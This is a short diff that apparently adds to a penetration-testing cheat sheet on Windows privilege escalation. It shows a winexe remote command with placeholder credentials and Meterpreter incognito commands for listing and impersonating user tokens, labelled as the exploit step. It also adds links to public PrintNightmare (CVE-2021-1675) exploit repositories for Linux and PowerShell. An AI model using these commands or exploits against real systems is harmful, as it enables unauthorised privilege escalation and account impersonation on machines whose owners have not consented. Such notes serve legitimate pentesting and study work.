@@ -81,3 +81,10 @@ winexe -U 'admin%password' //[target host] cmd.exe
 SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
 EXPLOITATION: https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
 
+load_incognito //load module.
+list_tokens -u //list tokens for users.
+impersonate_token domain\username //exploit.
+
+## PrintNightmare CVE-2021-1675
+Linux: https://github.com/cube0x0/CVE-2021-1675.git
+Windows PowerShell: https://github.com/calebstewart/CVE-2021-1675.git
